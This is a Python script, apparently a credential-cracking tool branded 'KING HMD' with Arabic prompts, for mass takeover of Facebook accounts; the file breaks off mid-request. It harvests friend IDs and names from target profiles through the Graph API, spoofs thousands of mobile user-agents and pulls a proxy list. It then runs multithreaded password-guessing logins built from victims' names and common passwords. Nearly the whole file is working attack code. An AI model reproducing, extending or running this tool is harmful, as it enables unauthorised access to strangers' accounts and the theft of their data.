import os

libs = ['requests','websocket', 'websocket-client==1.1.0', 'sys', 'random', 'threading', 'rich', 'random', 'bs4','webbrowser','sys']

for lib in libs:
    try:
        __import__(lib)
        print('\033[92mتم التحقق من وجود المكتبة {}'.format(lib))
    except ImportError:
        print('\033[93mجاري تحميل المكتبة {}'.format(lib))
        os.system('pip install {}'.format(lib))

print('\033[1;33mتم تحميل جميع المكتبات')
import requests,os,sys,random,datetime,time,re,json
from random import randint
from concurrent.futures import ThreadPoolExecutor as tred
import datetime,requests,sys
import requests,bs4,json,os,sys,random,datetime,time,re,threading
import urllib3,rich,base64
import threading
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import sys
import time
try:
    import user_agent
except:
    os.system("pip install user_agent")
from user_agent import generate_user_agent

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2024, 1, 2, 0, 0 ,0)
# if (x.strftime("%x"))>(g.strftime("%x")):
 # print('\n\n')
 # print('')
 # print('\n\n')
 # print(x)
 # sys.exit(0)
# if (x.strftime("%x"))==(g.strftime("%x")):
   # print('')
   # if(x.strftime("%X"))>(g.strftime("%X")):
    # print('\n\n')
    # print('')
    # print('\n\n')
    # sys.exit(0)
   # else:
    # print('')  
# else:
    # print('')
he={
'user-agent':generate_user_agent()
}
# u=requests.get("https://beseyat.com/calendars/today-date.php",headers=he).text
# text=u.split('"font-size:20px;">')[1].split('</span></td> </tr>')[0]
# text_without_spaces = "".join([char for char in text if char != " "])
# formatted_date_time = x.strftime("%d/%m/%Y")
# def compare_texts(text1, text2):
    # if text1 == text2:
        # print("تم تشغيل الاداة .")
    # else:
        # print(" .")
        # sys.exit()
# text1 = formatted_date_time
# text2 = text_without_spaces
# compare_texts(text1, text2)

logo='''
————————————————
• KING HMD •
————————————————
⢀⣀⣀⣀⣀⣠⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣏⠉⠈⣿⣿⣿⢦⣀⠀⠀⠀⠀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢿⠋⠻⣿⣷⣄⡙⠛⠋⠀⠈⠹⣷⠚⠛⣟⠽⣯⠝⠋⠙⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠉⠉⠙⢿⠲⠤⣼⡿⡆⠀⢢⠀⠉⠲⠏⠀⠀⠀⣇⢻⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⡇⢀⡼⠁⠀⠀⢸⠟⠉⠉⠛⢦⠀⠀⢿⡼⠿⡚⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣠⣶⡶⠿⢿⡿⣿⠟⢁⣀⣠⠔⠋⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠉⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣾⡞⠁⢀⣴⡯⠞⣡⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⣠⠄⣸⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠙⠀⠀⢿⣤⠤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⢰⡖⠒⢤⣧⣤⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠖⠋⠀⠀⠈⡧⠀⣏⠁⢰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠋⠁⠀⠀⠀⠀⠀⠈⠓⢦⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠁⠀⠀⢴⠒⠒⠢⡀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠶⠋⠀⠀⠀⠀⠀⡼⢀⡶⠆⢳⣤⠔⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠸⡀⠹⣀⣸⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⡶⠛⠁⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢿⡉⠛⢍⠛⠒⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⢠⡤⢤⣀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢯⡀⠀⠀⠀⢹⡆⠻⠦⠴⠃⢈⣣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠀⠀⠀⠀⢀⣼⣀⡖⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢅⣸⠁⠀⠀⠀⠸⡦⠖⠤⣀⠜⠁⠈⢷⠀⠀@z_s_o⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⡟⠀⠀⠀⠀⡏⠹⡗⢺⢻⡀⠀⠀⠀⠀⠀⠀⠀⣠⠿⠖⣉⣀⣱⠀⣀⡤⠤⢤⣄⠀⠀⠀⢀⣀⣸⠀⠀⠀⠐⠻⣗⠲⣄⠀
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠈⠉⠉⢹⠚⢷⣀⠀⠀⠀⠀⣀⡴⠛⠒⠊⠀⠀⣠⠎⠁⠀⠀⠀⠈⢳⡀⠀⣿⣸⡿⠀⠀⠀⠀⠀⠈⣇⠘⡆
⠀⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠸⡇⢸⠙⡟⠲⡖⠋⣯⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⡧⣎⣈⣿⠃⠀⠀⠀⠀⠀⠀⣼⣆⢻
⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⢼⡤⠃⡔⠁⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣯⠀⠀⠀⠀⠀⠀⢠⠷⠼⢺
⠀⠀⠀⠀⠀⠈⢳⣄⠀⠀⠀⠀⠀⠀⠐⠖⠚⠒⠞⠀⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠸⠽⠷⣄⣀⣀⣠⡶⠋⠀⢠⡟
⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⢯⡛⡷⠚⠁⢀⡴⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠒⠦⠤⠤⠤⠴⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠲⠿⠷⠒⠛⠉⠀
TELEGRAM | @z_s_o | @R_A_J_Y
————————————————

————————————————
'''
ugen=[]
ugen2=[]
try:
	prox = requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt', 'w').write(prox)
except Exception as e:
	print(' ')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; Redmi Note 5A Lite)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2101K6G'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['V2147'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	
	ugen.append(uaku2)
		
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
	
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
					
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen2.append(uaku2)
	
try:
    cokbrut=[]
    princp=[]



    id,id2,loop,ok,cp,akun,oprek,method,taplikasi,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
    taplikasi.append('ya')
    cokbrut=[]
    pwpluss,pwnya=[],[]
    pwv1=[]
    P = '\x1b[1;97m'
    M = '\x1b[1;91m'
    H = '\x1b[1;92m'
    K = '\x1b[1;93m'
    B = '\x1b[1;94m'
    U = '\x1b[1;95m' 
    O = '\x1b[1;96m'
    N = '\x1b[0m'    
    Z = "\033[1;30m"
    X = '\033[1;33m' #اصفر
    F = '\033[2;32m'
    Z = '\033[1;31m' 
    L = "\033[1;95m"  #ارجواني
    C = '\033[2;35m' #وردي
    A = '\033[2;39m' #ازرق
    sir = '\033[41m\x1b[1;97m'
    x = '\33[m' # DEFAULT
    m = '\x1b[1;91m' #RED +
    k = '\033[93m' # KUNING +
    h = '\x1b[1;92m' # HIJAU +
    hh = '\033[32m' # HIJAU -
    u = '\033[95m' # UNGU
    kk = '\033[33m' # KUNING -
    b = '\33[1;96m' # BIRU -
    p = '\x1b[0;34m' # BIRU +
    P = "\x1b[38;5;231m" # Putih
    J = "\x1b[38;5;208m" # Jingga
    print(X+logo)
    ID=input('ID : ')
    toen=input('TOKEN :' )
    os.system("clear||cls")
    print(('—'*25)+'\n• HMD @z_s_o •\n'+('—'*25))
    print("1. إضافة باسوردات من اختيارك")
    print("2. باسوردات من الاداة")
    choice = input("أدخل رقم : ")
    if '1' in choice:
    	num_passwords = int(input("أدخل عدد الباسوردات التي ترغب في إضافتها: "))
    	for i in range(num_passwords):
    		password = input(f"أدخل الباسورد رقم {i+1}: ")
    		pwv1.append(password)
    elif '2' in choice:
    	password=['1234512345',"12345@12345",'1122334455','077077','١٢٣٤٥٦',"0780780",'firstfirst','first123','firstlast','first1234','12345@@@@@','00998877','0099887766','009988776655','zzxxccvv','112233445566','11223344556677']
    	pwv1.extend(password)
    asu = random.choice([m,k,h,u,b])
except:()
def clear():
        os.system('clear||cls')
def back():
        login()
def login():

        try:
            with open("loginHMD.txt","r") as f:
                token =f.readline()
                tokenku.append(token)
            with open("loginHMD.txt","r") as g:
                coo =g.readline()
                tokenku.append(coo)
            try:
                requests.get('https://graph.facebook.com/me?fields=id,name&access_token=%s'%(tokenku[0])).json()['name']
        
                dump_massal()
            except KeyError:
                login_lagi334()
            except requests.exceptions.ConnectionError:
                print('ERROR Connection..!')
                exit()
        except IOError:
            login_lagi334()
def login_lagi334():
    	dictionary = {}
    	asu = random.choice([m,k,h,b,u])
    	print(('—'*25)+'\n•  •\n'+('—'*25))
    	print(M+'عذرا انت لاتمتلك حساب في الاداة قم بالتسجيل الان '+'\n')
    	your_cookies=input('cookies : ')
    	r=requests.Session()
    	hc={
'user-agent':generate_user_agent(),
'cookies':your_cookies
}
    	uc=r.get('https://m.facebook.com/',cookies=hc).text
    	if 'action="/composer/mbasic/?av=' in uc:
    		os.system('clear')
    		print(X+'تم ادخال الكوكيز بنجاح ✓')
    		cook= open("loginHMD2.txt","w").write(your_cookies)
    	else:
    		os.system('clear')
    		print('الكوكيز خطأ !')
    		login_lagi334()
    	print('\n')
    	print(('—'*25)+'\n• HMD @z_s_o •\n'+('—'*25))
    	print(Z+'الان ادخل حساب وهمي .')
    	user=input(f'ادخل ايدي او رقم هاتف فيسبوك  : ')
    	pas=input(M+f'ادخل الباسورد : ')
    	url = 'https://graph.facebook.com/v16.0/auth/login/'
    	data = {
                    "access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038",
                    "sdk_version": {randint(1,26)},
                    "email": user,
                    "locale": "ja_JP",
                    "password": pas,
                    "sdk": "android",
                    "generate_session_cookies": "1",
                    "sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
                    }
    	r.headers.update({
                    "Host": "graph.facebook.com",
                    "x-fb-connection-bandwidth": str(randint(20000000, 30000000)),
                    "x-fb-sim-hni": str(randint(20000, 40000)),
                    "x-fb-net-hni": str(randint(20000, 40000)),
                    "x-fb-connection-quality": "EXCELLENT",
                    "user-agent": 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',

                    "content-type": "application/x-www-form-urlencoded",
                    "x-fb-http-engine": "Liger"
                    })
    	ress = r.post(url, params=data).json()
    	if 'session_key' in ress:
    	      token = ress['access_token']
    	      tokenew = open("loginHMD.txt","w").write(token)
    	      print(X+"تم التسجيل ✓")
    	      login()
    	elif "www.facebook.com" in ress["error"]["message"]:
    	      print ('الحساب سكيور ! ⛔!\n')
    	      exit()
    	else:
    	      print ('خطأ في المعرف او كلمه المرور ❌\n')
    	      exit()
    	token = open('loginHMD.txt','r').read()
    	kukis = open('loginHMD2.txt','r').read()
    	cok = open('loginHMD.txt','r').read()
    	dump_massal()
    			
                
def dump_massal():
        try:
            token = open('loginHMD.txt','r').read()
            cok = open('loginHMD.txt','r').read()
            print(M+logo)
            jum = int(input(F+'عدد الايديات للسحب : '+X))
        except ValueError:
            print(Z+'الرجاء ادخال عدد الايديات')
            print('\n')
            dump_massal()
        if jum<1 or jum>100:
            print(Z+'ضع العدد من 1 الى 100 ')
            print('\n')
            dump_massal()
        yz = 0
        uid = set()
        for met in range(jum):
            yz+=1
            print(('—'*25)+'\n•  •\n'+('—'*25))
            print(M+'✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮✮')
            kl = input(F+'الايدي رقم '+str(yz)+F+' : ')
            if kl not in uid:
            	uid.add(kl)
            else:
            	print(L+'الإيدي مكرر. سيتم تجاهله.! ')
            	yz -= 1
        uid = list(uid)
        for userr in uid:
          try:
             
             head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
             params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
             url = requests.get('https://graph.facebook.com/{}'.format(userr),params=params,headers=head,cookies={'cookies':cok}).json()
             for mi in url['friends']['data']:
                    try:
                        iso = (mi['id']+'|'+mi['name'])
                        if iso in id:pass
                        else:id.append(iso)
                    except:continue
          except (KeyError,IOError):
          	pass
          except requests.exceptions.ConnectionError:
                     exit()
        try:
            clear()
            
            print(P+logo)
            print(f" <><><><><><>HMD<><><><><><><> ")            
            print(F+f'IDs » {h}'+'  ('+str(len(id))+')  ')
            time.sleep(3)
            if str(len(id)) == '0':
                print("قائمه الاصدقاء لدى اصحاب الايديات مقفوله .!")
                
            else:
                setting()
        except requests.exceptions.ConnectionError:
            print(f'{x}')
            print(Z+'ERROR Connection ..!')
            back()
        except (KeyError,IOError):
            print(f'{k} ERROR {x}')
            time.sleep(3)
            back()
    #-------------[ PENGATURAN-IDZ ]---------------#
def setting():
        muda=[]
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
        method.append('mobile')
        taplikasi.append('ya')
        pwpluss.append('no')
        passwrd()
    #-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
        clear()
        print(L+logo)
        print(X+f" <><><><><><>HMD<><><><><><><> ")            
        awal = datetime.datetime.now()
        with tred(max_workers=50) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv=[]
                
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+frs)
                        pwv.append(frs+' '+frs)
                        
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+frs)
                        pwv.append(frs+' '+frs)
                        
                       
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'mobile' in method:
                    pool.submit(crack,idf,pwv)
        print(('—'*25)+'\n•  @HMD•\n'+('—'*25))
        print(M+'\nDONE Ckracked 🔰')
def crack(idf,pwv):
        global loop,ok,cp
        pers = loop*100/len(id2)
        print(C+f"\r%s/%s OK > %s CP > %s"%(loop,len(id2),ok,cp),end=" ");sys.stdout.flush()

        ua = random.choice(ugen)
        ua2 = random.choice(ugen2) 
        ses = requests.Session()
        pwv=pwv1+pwv
        for pw in pwv:
            try:
                ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
